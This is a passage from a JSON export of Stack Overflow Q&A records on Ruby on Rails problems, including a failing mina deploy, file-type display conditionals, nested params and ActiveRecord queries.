rbenv not being loaded.</p>\n\n<p>If you're sure that ruby and bundler are correctly installed on the server as I was then the fix is to make sure the first thing your shell does it to load rbenv.</p>\n\n<p>Open <code>.bashrc</code></p>\n\n<p>Make sure the following <strong>is called before</strong></p>\n\n<p><code># If not running interactively, don't do anything</code></p>\n\n<pre><code>export PATH=\"$HOME/.rbenv/bin:$PATH\"\neval \"$(rbenv init -)\"\n</code></pre>\n"}], "owner": {"reputation": 113, "user_id": 2657566, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/3778b178758cde9deab511a0b867f08a?s=128&d=identicon&r=PG", "display_name": "Krishna Teja Karnam", "link": "https://stackoverflow.com/users/2657566/krishna-teja-karnam"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 516, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1590059926, "creation_date": 1511885563, "question_id": 47536104, "link": "https://stackoverflow.com/questions/47536104/mina-deploy-throws-error-bundle-command-not-found-error-deploy-failed", "title": "mina deploy throws error - bundle: command not found ! ERROR: Deploy failed", "body": "<p>Am trying to deploy rails app to digital ocean using mina gem. I did all the configuration and mina setup also is getting executed properly. </p>\n\n<p>mina deploy throws error. Any help would be much appreciated.</p>\n\n<p>Here is the mina deploy --trace</p>\n\n<pre><code>root@ruby-rails-1gb-blr1-01:/home/rails/rails-demo# mina deploy --trace\n** Invoke deploy (first_time)\n** Execute deploy\n** Invoke remote_environment (first_time)\n** Execute remote_environment\n** Invoke git:clone (first_time)\n** Execute git:clone\n** Invoke deploy:link_shared_paths (first_time)\n** Execute deploy:link_shared_paths\n** Invoke bundle:install (first_time)\n** Execute bundle:install\n** Invoke rails:db_migrate (first_time)\n** Execute rails:db_migrate\n** Invoke rails:assets_precompile (first_time)\n** Execute rails:assets_precompile\n** Invoke deploy:cleanup (first_time)\n** Execute deploy:cleanup\n** Invoke puma:phased_restart (first_time)\n** Invoke remote_environment (first_time)\n** Execute remote_environment\n** Execute puma:phased_restart\nroot@139.59.72.156's password: \n-----&gt; Creating a temporary build path\n-----&gt; Deploying rails-demo to 139.59.72.156:/home/rails/rails-demo\n-----&gt; Fetching new git commits\n       remote: Counting objects: 43, done.\nremote: Compressing objects: 100% (33/33), done.\nremote: Total 43 (delta 6), reused 43 (delta 6), pack-reused 0\nUnpacking objects: 100% (43/43), done.   \n       From github.com:krishnateja/rails-demo\n          739096a..4cf74f8  master     -&gt; master\n-----&gt; Using git branch 'master'\n       Cloning into '.'...\n       done.\n-----&gt; Using this git commit\n       root (4cf74f8):\n       &gt; small config change\n-----&gt; Symlinking shared paths\n-----&gt; Installing gem dependencies using Bundler\n       bash: line 137: bundle: command not found\n !     ERROR: Deploy failed.\n-----&gt; Cleaning up build\n       Unlinking current\n       OK\n       Connection to 139.59.72.156 closed.\n\n !     Run Error\n</code></pre>\n\n<p><strong>deploy.rb</strong></p>\n\n<pre><code>require 'mina/bundler'\nrequire 'mina/rails'\nrequire 'mina/git'\nrequire 'mina/rvm'\nrequire 'mina/puma'\n\nset :application_name, 'rails-demo'\nset :domain, '139.59.72.156'\nset :deploy_to, '/home/rails/rails-demo'\nset :repository, 'git@github.com:krishnateja/rails-demo.git'\n\nset :shared_dirs, fetch(:shared_dirs, []).push('log', 'tmp/pids', 'tmp/sockets', 'public/uploads')\nset :shared_files, fetch(:shared_files, []).push('config/database.yml', 'config/secrets.yml', 'config/puma.rb')\nset :user, 'root'\n\ntask :environment do\n  invoke :'rvm:use', 'ruby-2.2.3'\nend\n\ntask :setup do\n  command %[touch \"#{fetch(:shared_path)}/config/database.yml\"]\n  command %[touch \"#{fetch(:shared_path)}/config/secrets.yml\"]\n  command %[touch \"#{fetch(:shared_path)}/config/puma.rb\"]\n  comment \"Be sure to edit '#{fetch(:shared_path)}/config/database.yml', 'secrets.yml' and puma.rb.\"\nend\n\ntask :deploy do\n  deploy do\n    comment \"Deploying #{fetch(:application_name)} to #{fetch(:domain)}:#{fetch(:deploy_to)}\"\n    invoke :'git:clone'\n    invoke :'deploy:link_shared_paths'\n    invoke :'bundle:install'\n    invoke :'rails:db_migrate'\n    invoke :'rails:assets_precompile'\n    invoke :'deploy:cleanup'\n\n    on :launch do\n      invoke :'puma:phased_restart'\n    end\n  end\n\nend\n</code></pre>\n\n<p><strong>puma.rb</strong></p>\n\n<pre><code>environment \"production\"\n\nbind  \"unix:///home/rails/rails-demo/shared/tmp/sockets/puma.sock\"\npidfile \"/home/rails/rails-demo/shared/tmp/pids/puma.pid\"\nstate_path \"/home/rails/rails-demo/shared/tmp/sockets/puma.state\"\ndirectory \"/home/rails/rails-demo/current\"\n\nworkers 2\nthreads 1,2\n\ndaemonize true\n\nactivate_control_app 'unix:///home/rails/rails-demo/shared/tmp/sockets/pumactl.sock'\n\nprune_bundler\n</code></pre>\n\n<p>I Some how felt its something to do with the path to executable directory, hence did this.. \ngem environment - gives this. </p>\n\n<pre><code>root@ruby-rails-1gb-blr1-01:/home/rails/rails-demo# gem environment\nRubyGems Environment:\n  - RUBYGEMS VERSION: 2.6.14\n  - RUBY VERSION: 2.2.3 (2015-08-18 patchlevel 173) [x86_64-linux]\n  - INSTALLATION DIRECTORY: /usr/local/rvm/gems/ruby-2.2.3\n  - USER INSTALLATION DIRECTORY: /root/.gem/ruby/2.2.0\n  - RUBY EXECUTABLE: /usr/local/rvm/rubies/ruby-2.2.3/bin/ruby\n  - EXECUTABLE DIRECTORY: /usr/local/rvm/gems/ruby-2.2.3/bin\n  - SPEC CACHE DIRECTORY: /root/.gem/specs\n  - SYSTEM CONFIGURATION DIRECTORY: /usr/local/rvm/rubies/ruby-2.2.3/etc\n  - RUBYGEMS PLATFORMS:\n    - ruby\n    - x86_64-linux\n  - GEM PATHS:\n     - /usr/local/rvm/gems/ruby-2.2.3\n     - /usr/local/rvm/gems/ruby-2.2.3@global\n  - GEM CONFIGURATION:\n     - :update_sources =&gt; true\n     - :verbose =&gt; true\n     - :backtrace =&gt; false\n     - :bulk_threshold =&gt; 1000\n  - REMOTE SOURCES:\n     - https://rubygems.org/\n  - SHELL PATH:\n     - /usr/local/rvm/gems/ruby-2.2.3/bin\n     - /usr/local/rvm/gems/ruby-2.2.3@global/bin\n     - /usr/local/rvm/rubies/ruby-2.2.3/bin\n     - /usr/local/rvm/bin\n     - /usr/local/sbin\n     - /usr/local/bin\n     - /usr/sbin\n     - /usr/bin\n     - /sbin\n     - /bin\n     - /usr/games\n     - /usr/local/games\n     - /snap/bin\n</code></pre>\n\n<p>Added EXECUTABLE DIRECTORY to Path.</p>\n\n<pre><code>root@ruby-rails-1gb-blr1-01:/home/rails/rails-demo# export PATH=$PATH:/usr/local/rvm/gems/ruby-2.2.3/bin\nroot@ruby-rails-1gb-blr1-01:/home/rails/rails-demo# echo $PATH\n/usr/local/rvm/gems/ruby-2.2.3/bin:/usr/local/rvm/gems/ruby-2.2.3@global/bin:/usr/local/rvm/rubies/ruby-2.2.3/bin:/usr/local/rvm/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/local/rvm/gems/ruby-2.2.3/bin\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "file", "amazon-s3", "ruby-on-rails-5"], "comments": [{"owner": {"reputation": 540, "user_id": 6679233, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bbbbded9ce82f04a8cd114e5e7ae283c?s=128&d=identicon&r=PG&f=1", "display_name": "Maru", "link": "https://stackoverflow.com/users/6679233/maru"}, "edited": false, "score": 1, "creation_date": 1511884160, "post_id": 47535522, "comment_id": 82027973, "body": "can you confirm that the files are being uploaded properly? also what gem are you using for the file upload"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 1, "creation_date": 1511885615, "post_id": 47535522, "comment_id": 82029008, "body": "Can you provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>? I don&#39;t know what file you&#39;re uploading, or how it&#39;s uploaded, or how it&#39;s processed, or what the value of <code>file_content_type</code> is."}], "answers": [{"tags": [], "owner": {"reputation": 71, "user_id": 2888720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c0544a9fdecc937832ae333a955e8817?s=128&d=identicon&r=PG&f=1", "display_name": "Stephen Amsel", "link": "https://stackoverflow.com/users/2888720/stephen-amsel"}, "is_accepted": true, "score": 0, "last_activity_date": 1511928191, "creation_date": 1511928191, "answer_id": 47544856, "question_id": 47535522, "link": "https://stackoverflow.com/questions/47535522/ruby-on-rails-about-file-upload-and-show-file/47544856#47544856", "title": "ruby on rails : about file upload and show file", "body": "<p>I see at least a problem in your conditions:\nalpha || beta will just evaluate as beta if alpha is \"true-ish\".</p>\n\n<p>Try changing your conditionals to something like</p>\n\n<pre><code>['audio/mpeg', 'audio/x-mpeg', \n 'audio/mp3', 'audio/x-mp3'].include?(@listing.file_content_type)\n</code></pre>\n\n<p>This is probably why it's giving you an image instead of playing an audio file appropriately. The way you have it, unless your file is mp4, gif, or mpegaudio, you will get an image.</p>\n"}, {"tags": [], "owner": {"reputation": 326, "user_id": 3013354, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ad9dbf3df6d9dc0944bb224014a3bc2b?s=128&d=identicon&r=PG", "display_name": "nekogami", "link": "https://stackoverflow.com/users/3013354/nekogami"}, "is_accepted": false, "score": 0, "last_activity_date": 1511944939, "creation_date": 1511944939, "answer_id": 47548409, "question_id": 47535522, "link": "https://stackoverflow.com/questions/47535522/ruby-on-rails-about-file-upload-and-show-file/47548409#47548409", "title": "ruby on rails : about file upload and show file", "body": "<p>What library do you use for uploading ?</p>\n\n<p>If it's carrierwave / paperclip maybe try to give @listing.file.url as a parameter instead ?</p>\n"}], "owner": {"reputation": 31, "user_id": 8443614, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/5Zxxs.png?s=128&g=1", "display_name": "dxo", "link": "https://stackoverflow.com/users/8443614/dxo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 76, "favorite_count": 0, "accepted_answer_id": 47544856, "answer_count": 2, "score": 1, "last_activity_date": 1511944939, "creation_date": 1511883893, "question_id": 47535522, "link": "https://stackoverflow.com/questions/47535522/ruby-on-rails-about-file-upload-and-show-file", "title": "ruby on rails : about file upload and show file", "body": "<p>Currently, we can save various files using database and S3. However, it is not possible to display those files well.</p>\n\n<p>The code below is the showviewfile code. And there are two things I want to do here.</p>\n\n<pre><code>\u3000\u3000\u3000\u3000\u3000&lt;div class=\"listing_content\"&gt;\n            &lt;% if @listing.file_content_type == 'video/mp4' then %&gt;\n              &lt;%= video_tag @listing.file, :controls =&gt; true, width: \"640\", height: \"360\" %&gt;\n            &lt;% elsif @listing.file_content_type == \"image/jpg\" || \"image/jpeg\" || \"image/png\" || \"image/gif\" then %&gt;\n              &lt;%= image_tag @listing.file, :width =&gt; 640, :height =&gt; 340 %&gt;\n            &lt;% elsif @listing.file_content_type == 'audio/mpeg' || 'audio/x-mpeg' || 'audio/mp3' || 'audio/x-mp3' || 'audio/mpeg3' || 'audio/x-mpeg3' || 'audio/mpg' || 'audio/x-mpg' || 'audio/x-mpegaudio' then %&gt;\n              &lt;%= audio_tag @listing.file, :controls =&gt; true %&gt;\n            &lt;% else %&gt;\n              &lt;%= image_tag @listing.file %&gt;\n            &lt;% end %&gt;\n          &lt;/div&gt;\n</code></pre>\n\n<p>The first is to display the saved file for each format.\nSecond, see the image below. It means that audio files are not displayed properly.</p>\n\n<p><a href=\"https://i.stack.imgur.com/4HbA2.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/4HbA2.png\" alt=\"enter image description here\"></a></p>\n\n<p>So, I'd like to solve these problems, but I do not know how to solve it. How can we solve it?</p>\n\n<p>model file</p>\n\n<pre><code>validates_attachment :file, content_type: { content_type: ['audio/mpeg', 'audio/x-mpeg', 'audio/mp3', 'audio/x-mp3', 'audio/mpeg3', 'audio/x-mpeg3', 'audio/mpg', 'audio/x-mpg', 'audio/x-mpegaudio', 'video/mp4', 'text/plain', 'application/msword', 'application/vnd.ms-powerpoint', 'application/pdf', \"image/jpg\", \"image/jpeg\", \"image/png\", \"image/gif\"] }\n</code></pre>\n\n<p>please tell me\uff01\uff01</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 1223, "user_id": 3422357, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/F984j.jpg?s=128&g=1", "display_name": "Vishal Taj PM", "link": "https://stackoverflow.com/users/3422357/vishal-taj-pm"}, "edited": false, "score": 0, "creation_date": 1511882633, "post_id": 47534847, "comment_id": 82026924, "body": "why don&#39;t you try using accept_nested_attributes refer eg: <a href=\"https://robots.thoughtbot.com/accepts-nested-attributes-for-with-has-many-through\" rel=\"nofollow noreferrer\">robots.thoughtbot.com/&hellip;</a>"}, {"owner": {"reputation": 459, "user_id": 6859623, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4d763ef30fff1f0bedf896dd1c0ce71a?s=128&d=identicon&r=PG&f=1", "display_name": "angkiki", "link": "https://stackoverflow.com/users/6859623/angkiki"}, "reply_to_user": {"reputation": 1223, "user_id": 3422357, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/F984j.jpg?s=128&g=1", "display_name": "Vishal Taj PM", "link": "https://stackoverflow.com/users/3422357/vishal-taj-pm"}, "edited": false, "score": 0, "creation_date": 1511883068, "post_id": 47534847, "comment_id": 82027229, "body": "@VishalTajPM sorry but i don&#39;t see how that solves my problem. Maybe you could elaborate? Right now my trouble is with my params being submitted, and not because there&#39;s validation errors. Afaik, :inverse_of is used to solve a persistence problem, mainly because when creating the child, the parent has not hit the database (and in rails5, the belongs_to relation is enforced and a parent object is needed when creating the child)."}, {"owner": {"reputation": 3015, "user_id": 1518336, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/238d1c14366d5d0dd398b088c99f7b4c?s=128&d=identicon&r=PG", "display_name": "Daniel Westendorf", "link": "https://stackoverflow.com/users/1518336/daniel-westendorf"}, "edited": false, "score": 0, "creation_date": 1511885941, "post_id": 47534847, "comment_id": 82029219, "body": "<code>accept_nested_attributes</code> takes care of child field persistence for you, so you just save the parent object. <code>fields_for</code> and <code>accept_nested_attributes</code> are intended to work in conjunction to achieve seamless related model creation."}, {"owner": {"reputation": 960, "user_id": 4109592, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/7Sip6.jpg?s=128&g=1", "display_name": "Nick Schwaderer", "link": "https://stackoverflow.com/users/4109592/nick-schwaderer"}, "edited": false, "score": 0, "creation_date": 1511886229, "post_id": 47534847, "comment_id": 82029446, "body": "If you&#39;re battling against Rails 5&#39;s belongs_to enforcement, before going through too many hurdles I would just override that behavior by passing it along as optional: <code>belongs_to :grandparents, optional: true</code>"}, {"owner": {"reputation": 459, "user_id": 6859623, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4d763ef30fff1f0bedf896dd1c0ce71a?s=128&d=identicon&r=PG&f=1", "display_name": "angkiki", "link": "https://stackoverflow.com/users/6859623/angkiki"}, "reply_to_user": {"reputation": 3015, "user_id": 1518336, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/238d1c14366d5d0dd398b088c99f7b4c?s=128&d=identicon&r=PG", "display_name": "Daniel Westendorf", "link": "https://stackoverflow.com/users/1518336/daniel-westendorf"}, "edited": false, "score": 0, "creation_date": 1511888398, "post_id": 47534847, "comment_id": 82030824, "body": "@DanielWestendorf oh yes i am actually aware of that. I was just responding the Vishal regarding his comment and how it was not applicable to the current problem i&#39;m facing..."}, {"owner": {"reputation": 459, "user_id": 6859623, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4d763ef30fff1f0bedf896dd1c0ce71a?s=128&d=identicon&r=PG&f=1", "display_name": "angkiki", "link": "https://stackoverflow.com/users/6859623/angkiki"}, "reply_to_user": {"reputation": 960, "user_id": 4109592, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/7Sip6.jpg?s=128&g=1", "display_name": "Nick Schwaderer", "link": "https://stackoverflow.com/users/4109592/nick-schwaderer"}, "edited": false, "score": 0, "creation_date": 1511888446, "post_id": 47534847, "comment_id": 82030858, "body": "@Schwad i&#39;m not actually... in the question the problem i&#39;m facing is Rails form generators creating IDs for form elements, resulting in weird params which i do not know how to handle..."}], "owner": {"reputation": 459, "user_id": 6859623, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4d763ef30fff1f0bedf896dd1c0ce71a?s=128&d=identicon&r=PG&f=1", "display_name": "angkiki", "link": "https://stackoverflow.com/users/6859623/angkiki"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 54, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1511881914, "creation_date": 1511881914, "question_id": 47534847, "link": "https://stackoverflow.com/questions/47534847/rails-5-whitelist-nested-field-params-generated-from-looped-object", "title": "Rails 5 - Whitelist Nested Field Params Generated from Looped Object", "body": "<p>Okay, so the problem I have here is that my params are looking funny because i'm looping through one of my form elements to create the fields.</p>\n\n<p>Here's the code</p>\n\n<p><code>parent-new-form-creation.html.erb</code></p>\n\n<pre><code>#other parts of parent form\n\n&lt;% @grandparent.friends.each do |g| %&gt;\n  &lt;%= render \"child_fields\", f: builder %&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>Now the problem here is that when the form is generated, the <code>Child_fields</code> fields would have IDs, such as:</p>\n\n<pre><code>&lt;input name=\"parent[child_attributes][0][foo]\" id=\"parent_child_attributes_0_foo\" /&gt;\n</code></pre>\n\n<p>Now these IDs automatically generated for these inputs are messing up my params, because they end up looking like these when submitted:</p>\n\n<pre><code>\"child_attributes\"=&gt;{\"0\"=&gt;{\"foo\"=&gt;\"1\", \"moo\"=&gt;\"A\"}, \"1\"=&gt;{\"foo\"=&gt;\"0\", \"moo\"=&gt;\"A1\"}}\n</code></pre>\n\n<p>Now i'm rather certain that the other \"regular\" aspects of accepting nested attributes are set up properly. Its just this whitelisting portion of the params during the creation which is giving me some trouble, seeing as how i have no idea how i. </p>\n\n<p>I feel like i need to amend my params, but i'm not quite sure how. It's currently </p>\n\n<pre><code>child_attributes: [:foo, :moo]\n</code></pre>\n\n<p>Can anyone point me in the right direction?</p>\n"}, {"tags": ["ruby", "ruby-on-rails-4"], "comments": [{"owner": {"reputation": 16672, "user_id": 22237, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/hkobD.png?s=128&g=1", "display_name": "Kris", "link": "https://stackoverflow.com/users/22237/kris"}, "edited": false, "score": 0, "creation_date": 1511882334, "post_id": 47534725, "comment_id": 82026706, "body": "<code>@address.where(customer_address: nil).order(&quot;updated_at ASC&quot;).last</code>?"}], "answers": [{"tags": [], "owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "is_accepted": false, "score": 1, "last_activity_date": 1511882536, "creation_date": 1511882536, "answer_id": 47535041, "question_id": 47534725, "link": "https://stackoverflow.com/questions/47534725/get-specific-record-from-an-active-record-relation/47535041#47535041", "title": "get specific record from an active record relation", "body": "<pre><code>Address\n  .where(code: \"abc_1\")\n  .where.not(customer_address: ['', nil])\n  .order(:updated_at)\n  .last\n</code></pre>\n\n<p>This does not necessarily guarantee what you are asking, since you don't actually <em>store</em> \"when was the address last updated\"; you only store when the <em>record</em> was last updated.</p>\n\n<p>So this could also, for example, be when the <code>code</code> changed. However, this is the best you can do given the current data model.</p>\n\n<p>This approach is better than your original, since the entire query is performed in a single SQL statement and no additional records are loaded into memory.</p>\n"}], "owner": {"reputation": 265, "user_id": 492919, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/ba64c96f5400159f84a6de03b0a7eff3?s=128&d=identicon&r=PG", "display_name": "mike", "link": "https://stackoverflow.com/users/492919/mike"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 28, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1511882536, "creation_date": 1511881530, "question_id": 47534725, "link": "https://stackoverflow.com/questions/47534725/get-specific-record-from-an-active-record-relation", "title": "get specific record from an active record relation", "body": "<p>I have following data in database for table customer</p>\n\n<pre><code>id   customer_address     code       created_at            updated_at\n1                         abc_1    2017-11-21 02:58:04  2017-11-21 02:58:04\n2    122 st. CA           abc_1    2017-11-24 14:26:02  2017-11-24 14:26:02\n3    224 st. CA           abc_1    2017-11-28 14:26:02  2017-11-28 14:26:02\n</code></pre>\n\n<p>Customer address for first record id=1 is blank. Code is same for each customer. For code input param i want to return record which has most updated address so in this case record id=3.\nI have following activerecord relation available in @address</p>\n\n<pre><code>#&lt;ActiveRecord: : Relation[\n  #&lt;Address id: 1,\n  customer_address: \u201c\u201d,\n  code: \u201cabc_1\u201d,\n  created_at: \"2017-11-21 02:58:04\",\n  updated_at: \"2017-11-21 02:58:04\"&gt;,\n  #&lt;Address id: 2,\n  customer_address: \u201c123 st.CA\u201d,\n  code: \u201cabc_1\u201d,\n  created_at: \"2017-11-24 14:26:02\",\n  updated_at: \"2017-11-24 14:26:02\"&gt;,\n  #&lt;Address id: 3,\n  customer_address: \u201c224 st.CA\u201d,\n  code: \u201cabc_1\u201d,\n  created_at: \"2017-11-28 14:26:02\",\n  updated_at: \"2017-11-28 14:26:02\"&gt;,\n]&gt;\n</code></pre>\n\n<p>I tried following</p>\n\n<pre><code>@address = @address.select { |h| h[:customer_address] != '' } if @address.any? { |h| h[:customer_address] == '' }\n@address = [@address.max_by { |h| h[:created_at] }]\n</code></pre>\n\n<p>is there a better way to do this?</p>\n\n<p>Thanks</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 856, "user_id": 627094, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9680b8f6c0f3de85198193620b64aec4?s=128&d=identicon&r=PG", "display_name": "Luis Ortega Araneda", "link": "https://stackoverflow.com/users/627094/luis-ortega-araneda"}, "edited": false, "score": 0, "creation_date": 1511881133, "post_id": 47534565, "comment_id": 82025846, "body": "I believe with remote=true you won&#39;t refresh the web page... that&#39;s how it&#39;s suppose to work. But I don&#39;t understand the question very well, could you elaborate?"}, {"owner": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "edited": false, "score": 0, "creation_date": 1511881210, "post_id": 47534565, "comment_id": 82025908, "body": "<a href=\"http://guides.rubyonrails.org/working_with_javascript_in_rails.html#remote-elements\" rel=\"nofollow noreferrer\">guides.rubyonrails.org/&hellip;</a>"}, {"owner": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "reply_to_user": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "edited": false, "score": 1, "creation_date": 1511884294, "post_id": 47534565, "comment_id": 82028063, "body": "To expand on the comment from @SebastianPalma (just a wee bit): This behavior is correct."}], "answers": [{"tags": [], "owner": {"reputation": 2607, "user_id": 4470392, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CvLjT.jpg?s=128&g=1", "display_name": "Maxim Pontyushenko", "link": "https://stackoverflow.com/users/4470392/maxim-pontyushenko"}, "is_accepted": false, "score": 0, "last_activity_date": 1511887845, "creation_date": 1511887845, "answer_id": 47536864, "question_id": 47534565, "link": "https://stackoverflow.com/questions/47534565/remote-true-without-repond-to-format-js-in-controller/47536864#47536864", "title": "remote: true without repond_to format.js in controller", "body": "<p><code>remote: true</code> option is mostly used for ajax request. For example you can do something on back-end only or return some javascript code that will do something with your current html page. So yes, such behavior is a norm.</p>\n\n<p>There is more information in <a href=\"http://guides.rubyonrails.org/working_with_javascript_in_rails.html\" rel=\"nofollow noreferrer\">official rails guides</a>.</p>\n"}], "owner": {"reputation": 401, "user_id": 7156757, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8768142e36048bf7d98b346110611ebc?s=128&d=identicon&r=PG&f=1", "display_name": "O.Vykhor", "link": "https://stackoverflow.com/users/7156757/o-vykhor"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 44, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1511887845, "creation_date": 1511881002, "question_id": 47534565, "link": "https://stackoverflow.com/questions/47534565/remote-true-without-repond-to-format-js-in-controller", "title": "remote: true without repond_to format.js in controller", "body": "<p>I have sending button with remote: true attribute, and if my controller doesnt have respond_to format.js, data, sended by button with remote: true, is showing without refresing web page. This behaviour incorrect?</p>\n"}, {"tags": ["ruby", "regex"], "comments": [{"owner": {"reputation": 1202, "user_id": 8118087, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/AbMWy.jpg?s=128&g=1", "display_name": "pLOPeGG", "link": "https://stackoverflow.com/users/8118087/plopegg"}, "edited": false, "score": 0, "creation_date": 1511879828, "post_id": 47533887, "comment_id": 82024873, "body": "I don&#39;t know if I understood well what you want, but you can use this regex to catch the part you want. &quot;(\\{.*\\})\\{&quot; I don&#39;t know with ruby but with most regex methods you can get the result you caught and put it into a string."}, {"owner": {"reputation": 11394, "user_id": 794481, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/344337b6819f2f513fa80bb227be3c2d?s=128&d=identicon&r=PG", "display_name": "Tallboy", "link": "https://stackoverflow.com/users/794481/tallboy"}, "reply_to_user": {"reputation": 1202, "user_id": 8118087, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/AbMWy.jpg?s=128&g=1", "display_name": "pLOPeGG", "link": "https://stackoverflow.com/users/8118087/plopegg"}, "edited": false, "score": 0, "creation_date": 1511880012, "post_id": 47533887, "comment_id": 82025035, "body": "@pLOPeGG thanks ill give that a shot"}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511880649, "post_id": 47533887, "comment_id": 82025488, "body": "apologies @Tallboy, I had no idea that this response was coming form an external API. Perhaps, you should try to get it fixed by reporting it to them. In the meanwhile, How are you diffrentiating the valid JSON from invalid JSON in your example <code>{&quot;a&quot;: 1, &quot;b&quot;: {...}}{&quot;x&quot;: 2, &quot;y&quot;: 3}</code>."}, {"owner": {"reputation": 11394, "user_id": 794481, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/344337b6819f2f513fa80bb227be3c2d?s=128&d=identicon&r=PG", "display_name": "Tallboy", "link": "https://stackoverflow.com/users/794481/tallboy"}, "edited": false, "score": 0, "creation_date": 1511880838, "post_id": 47533887, "comment_id": 82025625, "body": "Also to the person who voted to close this...........why? It is a direct regex question."}, {"owner": {"reputation": 11394, "user_id": 794481, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/344337b6819f2f513fa80bb227be3c2d?s=128&d=identicon&r=PG", "display_name": "Tallboy", "link": "https://stackoverflow.com/users/794481/tallboy"}, "edited": false, "score": 0, "creation_date": 1511880930, "post_id": 47533887, "comment_id": 82025686, "body": "I almost solved it by doing this <code>&#47;(.+)({.+)$&#47;</code>, but it doesn&#39;t work with multiline strings, and for some reason if I replace <code>$</code> with <code>\\z</code> it stops working.. still trying to figure that one out. As for the valid JSON comment, that&#39;s a good point but I really am not trying to validate it as I know its valid. Im just trying to extract out the last chunk, starting with the last <code>{...}</code> block of the multi-line string (some of the JSON values include <code>\\r\\n</code>)"}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511882795, "post_id": 47533887, "comment_id": 82027031, "body": "lol @Tallboy your bragging made me laugh (no offense :p). I still think, you should contact the developers of the external API and get it sorted out. You will be doing them a favor by reporting it. Also, I did not know that you could not change the source because you never mentioned it anywhere."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1511904930, "post_id": 47533887, "comment_id": 82039803, 